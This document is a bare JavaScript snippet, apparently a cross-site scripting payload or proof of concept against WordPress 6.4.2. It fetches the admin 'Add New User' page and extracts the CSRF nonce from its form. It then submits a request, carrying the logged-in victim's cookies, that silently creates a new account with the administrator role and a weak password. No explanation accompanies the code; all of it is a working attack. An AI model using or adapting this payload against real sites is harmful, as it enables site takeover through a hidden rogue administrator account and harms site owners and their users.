fetch('http://localhost/wordpress-6.4.2/wordpress/wp-admin/user-new.php')
  .then(response => response.text())
  .then(html => {
    const tokenValue = (new DOMParser().parseFromString(html, 'text/html')).querySelector('form[method="post"] input#_wpnonce_create-user').value;
        fetch('http://localhost/wordpress-6.4.2/wordpress/wp-admin/user-new.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }, credentials: 'include',
      body: `action=createuser&_wpnonce_create-user=${tokenValue }&_wp_http_referer=%2Fwordpress-6.4.2%2Fwordpress%2Fwp-admin%2Fuser-new.php&user_login=test13333&email=test13333%40gmail.com&first_name=test13333&last_name=test13337&url=test13337&pass1=123123123&pass2=123123123&pw_weak=on&send_user_notification=1&role=administrator&createuser=Add+New+User`
    }).then(response => response.json())
    .then(data => console.log('Response from API:', data))
})
